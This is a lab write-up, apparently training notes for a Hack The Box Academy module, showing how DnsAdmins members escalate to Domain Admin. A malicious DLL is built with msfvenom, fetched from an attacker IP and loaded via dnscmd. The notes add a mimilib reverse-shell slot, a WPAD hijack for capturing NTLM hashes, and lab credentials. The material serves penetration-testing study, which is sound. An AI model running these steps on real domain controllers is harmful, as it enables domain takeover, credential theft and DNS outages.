# Section 12 — DnsAdmins

> **Lab: yes** — RDP to DC as DnsAdmins member. Load malicious DLL via DNS service plugin to escalate to Domain Admin.

**Core principle:** The Windows DNS service runs as `NT AUTHORITY\SYSTEM`. Members of the `DnsAdmins` group can configure a custom server-level plugin DLL via `dnscmd`. When DNS restarts, that DLL executes as SYSTEM — giving full domain compromise on a Domain Controller.

---

## Why this works

```
1. DNS management uses RPC — dnscmd configures it remotely or locally
2. ServerLevelPluginDll registry key accepts ANY path with zero verification
3. DnsAdmins members can write this key via dnscmd (not direct registry access)
4. DNS service restart loads the DLL as NT AUTHORITY\SYSTEM
5. DLL executes arbitrary code — add Domain Admin, reverse shell, dump creds
```

**Why it's common:** DNS almost always runs on Domain Controllers. Any user in the DnsAdmins group (often delegated to helpdesk/IT staff) can abuse this.

---

## Prerequisites

| Requirement | Why |
|-------------|-----|
| DnsAdmins group membership | Required to run `dnscmd /config /serverlevelplugindll` |
| Ability to restart DNS service | Need `SERVICE_START` + `SERVICE_STOP` (RPWP) permissions on the DNS service, OR wait for a reboot |
| DLL delivery | DLL must be on a path accessible to the DC machine account (local path or UNC share) |

---

## Attack overview — three methods

| Method | DLL | Effect |
|--------|-----|--------|
| **msfvenom DLL** | Custom payload — add user to Domain Admins | Stealthy, single action |
| **mimilib.dll** | Modified Mimikatz DLL — arbitrary command execution on every DNS query | Persistent backdoor |
| **WPAD record** | No DLL — disable global query block list + create WPAD record | Traffic interception via Responder/Inveigh |

---

## Method 1: msfvenom DLL (primary attack)

### Step 1: Generate the malicious DLL (attacker box)

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <YOUR_USER> /add /domain' -f dll -o adduser.dll
```
> Creates a DLL that, when loaded by the DNS service, runs a `net group` command to add your controlled user to Domain Admins. The DNS service runs as SYSTEM so this succeeds. Replace `<YOUR_USER>` with the account you control (e.g., `netadm`).

### Step 2: Host the DLL (attacker box)

```bash
python3 -m http.server <SERVE_PORT>
```
> Starts a simple HTTP server so the target can download the DLL. Use any port — the DC just needs to reach it over the VPN tunnel.

### Step 3: Download DLL to target (target box)

```powershell
wget "http://<ATTACKER_IP>:<SERVE_PORT>/adduser.dll" -outfile "C:\Users\<YOUR_USER>\Desktop\adduser.dll"
```
> Downloads the DLL to a writable path on the DC. Use the full path — `dnscmd` requires an absolute path to the DLL.

### Step 4: Confirm DnsAdmins membership (target box)

```powershell
Get-ADGroupMember -Identity DnsAdmins
```
> Verify your user is listed. If not, this attack won't work — `dnscmd` will return `ERROR_ACCESS_DENIED`.

```cmd
whoami /groups | findstr /i "DnsAdmins"
```
> Alternative check using current session token. If you were recently added to the group, you may need to log out and back in for the token to update.

### Step 5: Load the custom DLL via dnscmd (target box)

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\<YOUR_USER>\Desktop\adduser.dll
```
> Writes the DLL path to the `ServerLevelPluginDll` registry key under `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`. This is the key step — only DnsAdmins members can do this. **Must use the full absolute path or the attack fails.**

**What happens if a non-DnsAdmin runs this:**
```
DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

### Step 6: Check if you can restart DNS (target box)

```cmd
wmic useraccount where name="<YOUR_USER>" get sid
```
> Gets your SID — needed to look up your specific permissions in the service SDDL.

```cmd
sc.exe sdshow DNS
```
> Displays the Security Descriptor (SDDL) for the DNS service. Look for your SID in the output. `RPWP` permissions on your SID mean you have `SERVICE_START` and `SERVICE_STOP`.

**SDDL permission reference:**
| Code | Permission |
|------|-----------|
| RP | SERVICE_START |
| WP | SERVICE_STOP |
| CC | SERVICE_QUERY_CONFIG |
| LC | SERVICE_QUERY_STATUS |
| RC | READ_CONTROL |

### Step 7: Restart DNS service (target box)

> **CRITICAL: Use `sc.exe`, not `sc`.** In PowerShell, `sc` is an alias for `Set-Content` — it silently does nothing to services. This will waste your time on the exam. Always use the full `sc.exe` name.

```cmd
sc.exe stop dns
```
> Stops the DNS service. **This is destructive — DNS resolution stops for the entire domain until the service restarts.** Get explicit client permission on real engagements.

```cmd
sc.exe start dns
```
> Starts the DNS service. During startup, it loads our malicious DLL as SYSTEM and executes the payload. The service may fail to fully start (the DLL isn't a real DNS plugin) — that's expected. The payload still executes.

### Step 8: Confirm escalation (target box)

```cmd
net group "Domain Admins" /dom
```
> Check if your user now appears in the Domain Admins group. If it does, the DLL executed successfully.

---

## Cleanup (REQUIRED on real engagements)

> Must be run from an elevated prompt (local admin or domain admin).

### Verify the registry key exists

```cmd
reg query \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
> Look for `ServerLevelPluginDll` in the output. DNS won't start correctly until this key is removed.

### Delete the registry key

```cmd
reg delete \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```
> Removes the malicious DLL reference. Confirm with `Y` when prompted. Without this, DNS stays broken.

### Restart DNS cleanly

```cmd
sc.exe start dns
```
> DNS should now start normally without attempting to load the plugin.

### Confirm DNS is running

```cmd
sc query dns
```
> State should show `4 RUNNING`. Verify with `nslookup` against localhost to confirm name resolution works.

---

## Method 2: mimilib.dll (persistent command execution)

Instead of msfvenom, compile a custom `mimilib.dll` with a modified `kdns.c` — the `kdns_DnsPluginQuery` function runs on **every DNS query** the server processes.

```c
DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, ...)
{
    FILE * kdns_logfile;
    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
    {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system("ENTER COMMAND HERE");  // <-- your payload
    }
    return ERROR_SUCCESS;
}
```
> Replace `ENTER COMMAND HERE` with a reverse shell one-liner or credential dump command. Every DNS query triggers it — persistent execution as SYSTEM.

**Trade-off vs. msfvenom:** More persistent (fires on every query) but requires compiling the DLL. msfvenom is faster for a one-shot escalation.

---

## Method 3: WPAD record attack (no DLL needed)

DnsAdmins can also abuse their DNS management rights to intercept traffic:

### Disable global query block list

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <DC_FQDN>
```
> By default, Windows DNS blocks WPAD and ISATAP queries to prevent hijacking. DnsAdmins can disable this protection.

### Create a WPAD record pointing to attacker

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName <DOMAIN> -ComputerName <DC_FQDN> -IPv4Address <ATTACKER_IP>
```
> Every machine with default WPAD settings will now proxy traffic through your IP. Run Responder or Inveigh to capture NTLM hashes.

**Trade-off:** No DLL, no service restart — but you only get hashes (need to crack or relay), not direct code execution.

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-WINLPE-DC01)
**Creds:** `netadm` / `HTB_@cademy_stdnt!`
**Goal:** Escalate via DnsAdmins → read `c:\Users\Administrator\Desktop\DnsAdmins\flag.txt`
**Access:** RDP

### Attack chain (editable)

```
┌─────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                │
├─────────────────────────────────────────────────────────┤
│ TARGET_IP    = <TARGET_IP>                              │
│ ATTACKER_IP  = <ATTACKER_IP>  (tun0 IP)                │
│ USERNAME     = netadm                                   │
│ PASSWORD     = HTB_@cademy_stdnt!                       │
│ SERVE_PORT   = 7777                                     │
│ DLL_NAME     = adduser.dll                              │
│ DLL_PATH     = C:\Users\netadm\Desktop\adduser.dll     │
│ FLAG_PATH    = c:\Users\Administrator\Desktop\          │
│                DnsAdmins\flag.txt                       │
└─────────────────────────────────────────────────────────┘

ATTACKER BOX
─────────────
1. Generate DLL
   msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

2. Host it
   python3 -m http.server 7777

3. RDP to target
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:netadm /p:'HTB_@cademy_stdnt!'

TARGET BOX (as netadm via RDP)
──────────────────────────────
4. Download the DLL
   wget "http://<ATTACKER_IP>:7777/adduser.dll" -outfile "C:\Users\netadm\Desktop\adduser.dll"

5. Confirm DnsAdmins membership
   Get-ADGroupMember -Identity DnsAdmins
   whoami /groups | findstr /i "DnsAdmins"

6. Load the DLL into DNS config
   dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

7. Check if we can restart DNS
   wmic useraccount where name="netadm" get sid
   sc.exe sdshow DNS
   (Look for your SID with RPWP = start+stop)

8. Restart DNS
   sc.exe stop dns
   sc.exe start dns

9. Confirm Domain Admin
   net group "Domain Admins" /dom
   (netadm should be listed)

10. Read the flag
    type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt

CLEANUP (from elevated prompt after escalation)
────────────────────────────────────────────────
11. Remove registry key
    reg delete \\<TARGET_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

12. Restart DNS cleanly
    sc.exe start dns
    sc query dns
```

---

## Lab observations & attack chain

```
DnsAdmins group membership (netadm)
│
├── Generate malicious DLL (msfvenom — adds netadm to Domain Admins)
│   └── Transfer DLL to DC (HTTP server → wget)
│
├── Configure DNS to load DLL
│   └── dnscmd /config /serverlevelplugindll <full_path_to_DLL>
│       └── Writes to ServerLevelPluginDll registry key
│
├── Restart DNS service (requires RPWP permissions)
│   ├── sc.exe stop dns  → DNS goes down (destructive!)
│   └── sc.exe start dns → DLL loads as NT AUTHORITY\SYSTEM
│       └── Payload executes: net group "domain admins" netadm /add /domain
│
├── Post-escalation (now Domain Admin)
│   ├── Read flag: type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
│   ├── secretsdump.py for full domain hash dump
│   ├── Access any share, any machine
│   └── DCSync for persistence
│
└── Cleanup (MANDATORY)
    ├── reg delete ServerLevelPluginDll key
    ├── sc start dns (restore service)
    └── Remove netadm from Domain Admins if no longer needed
```

---

## Alternative attack paths from DnsAdmins

| If you CAN'T restart DNS... | Do this instead |
|------------------------------|----------------|
| No RPWP permissions | Load the DLL and wait for a reboot or scheduled restart |
| DLL path blocked | Use a UNC path (`\\attacker\share\evil.dll`) — DC machine account must reach your share |
| Want stealth over speed | Use WPAD record attack — no service disruption, but only gets hashes |
| Want persistence | Use mimilib.dll — fires on every DNS query, survives reboots until key is removed |

---

## Key takeaways

- **DnsAdmins = Domain Admin on any DC running DNS.** This is one of the most direct group-based privesc paths in AD.
- **`dnscmd` is the only tool that works.** DnsAdmins can't edit the registry directly — only through the DNS management RPC interface.
- **Full absolute path required.** Relative paths silently fail.
- **DNS restart is destructive.** On a real engagement, this takes down name resolution for the entire domain. Always get client sign-off.
- **Cleanup is non-optional.** The DNS service stays broken until the `ServerLevelPluginDll` key is removed.
- **Three attack variants:** msfvenom DLL (fast escalation), mimilib.dll (persistent backdoor), WPAD record (traffic interception without service disruption).
- **Check service permissions with `sc.exe sdshow DNS`.** RPWP on your SID = you can start/stop the service.
- **Always use `sc.exe` in PowerShell, never `sc`.** PowerShell aliases `sc` to `Set-Content` — service commands silently do nothing. This is an exam time-killer.
- **Log out and back in after adding yourself to Domain Admins.** Your token doesn't update until you get a fresh logon session.
